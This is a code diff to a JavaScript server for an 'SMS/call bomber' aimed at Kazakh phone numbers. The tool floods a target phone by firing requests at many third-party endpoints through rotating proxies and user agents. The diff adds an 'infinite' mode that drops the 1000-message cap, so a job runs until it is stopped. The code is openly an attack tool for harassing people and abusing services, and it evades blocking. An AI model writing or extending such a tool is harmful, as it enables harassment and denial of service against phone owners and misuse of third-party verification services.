@@ -185,9 +185,9 @@ async function fireEndpoint(ep,forms,cfg,roundUA,roundProxy){
 const bomberJobs=new Map();
 const JOB_TTL_MS=60*60*1000;
 function pruneBomberJobs(){const t=Date.now();for(const[id,j]of bomberJobs)if(t-j.startedAt>JOB_TTL_MS)bomberJobs.delete(id);}
-async function runBomberJob(rawPhone,count,channel,simulation,liveProxies){
+async function runBomberJob(rawPhone,count,channel,simulation,liveProxies,infinite=false){
  pruneBomberJobs();
- if(!Number.isInteger(count)||count<1||count>1000)throw new Error('count must be 1..1000');
+ if(!infinite&&(!Number.isInteger(count)||count<1||count>1000))throw new Error('count must be 1..1000');
  const forms=normalizeKzPhone(rawPhone);
  if(!forms.e164)throw new Error(forms.error);
  if(!forms.valid)throw new Error(forms.error+' (use ! to force)');
@@ -199,7 +199,7 @@ async function runBomberJob(rawPhone,count,channel,simulation,liveProxies){
  cfg.simulation=simulation!==false;
  if(Array.isArray(liveProxies)&&liveProxies.length)cfg.proxies=liveProxies;
  const id=Math.random().toString(36).slice(2,10);
- const job={id,phone:forms.e164,total:count,sent:0,failed:0,done:false,stopped:false,stopRequested:false,events:[],startedAt:Date.now(),forms,cfg,want,rounds:count};
+ const job={id,phone:forms.e164,total:infinite?null:count,infinite,sent:0,failed:0,done:false,stopped:false,stopRequested:false,events:[],startedAt:Date.now(),forms,cfg,want,rounds:infinite?null:count};
  bomberJobs.set(id,job);
  (async()=>{
   try{
@@ -210,10 +210,10 @@ async function runBomberJob(rawPhone,count,channel,simulation,liveProxies){
     const cooldown=Math.max(500,cfg.perEndpointCooldownMs);
     const lastHit=new Map();
     const active=new Set();
-    const total=count;
+    const total=infinite?Infinity:count;
     let dispatched=0;
     const tickOnce=()=>{
-     if(job.stopRequested||dispatched>=total)return;
+     if(job.stopRequested||(!infinite&&dispatched>=total))return;
      const now=Date.now();
      const candidates=eligible.filter(ep=>!active.has(ep.name)&&now-(lastHit.get(ep.name)||0)>=cooldown);
      if(!candidates.length)return;
@@ -237,7 +237,7 @@ async function runBomberJob(rawPhone,count,channel,simulation,liveProxies){
     await new Promise(resolve=>{
      const timer=setInterval(()=>{
       if(job.stopRequested){clearInterval(timer);resolve();return;}
-      if(dispatched>=total&&active.size===0){clearInterval(timer);resolve();return;}
+      if(!infinite&&dispatched>=total&&active.size===0){clearInterval(timer);resolve();return;}
       tickOnce();
      },intervalMs);
     });
@@ -246,16 +246,16 @@ async function runBomberJob(rawPhone,count,channel,simulation,liveProxies){
    job.events.push({seq:job.events.length+1,phone:forms.e164,channel:'system',name:'worker',status:'failed',http:null,error:String(err.message||err).slice(0,160)});
   }finally{job.done=true;}
  })();
- return{id,phone:forms.e164,total:count};
+ return{id,phone:forms.e164,total:infinite?null:count,infinite};
 }
 function snapshotBomberJob(j){
- return{id:j.id,phone:j.phone,total:j.total,sent:j.sent,failed:j.failed,done:j.done,stopped:j.stopped,elapsed:Math.round((Date.now()-j.startedAt)/100)/10,events:j.events};
+ return{id:j.id,phone:j.phone,total:j.total,infinite:!!j.infinite,sent:j.sent,failed:j.failed,done:j.done,stopped:j.stopped,elapsed:Math.round((Date.now()-j.startedAt)/100)/10,events:j.events};
 }
 async function handleBomberRoute(req,res,pathname){
  if(pathname==='/api/dispatch'&&req.method==='POST'){
   try{
    const b=await body(req);
-   const out=await runBomberJob(String(b.phone||'').trim(),Number(b.count||1),String(b.channel||'both').toLowerCase(),b.simulation!==false,Array.isArray(b.proxies)?b.proxies:null);
+   const out=await runBomberJob(String(b.phone||'').trim(),Number(b.count||1),String(b.channel||'both').toLowerCase(),b.simulation!==false,Array.isArray(b.proxies)?b.proxies:null,b.infinite===true);
    json(res,200,out);
   }catch(e){json(res,400,{error:e.message||'dispatch failed'});}
   return true;
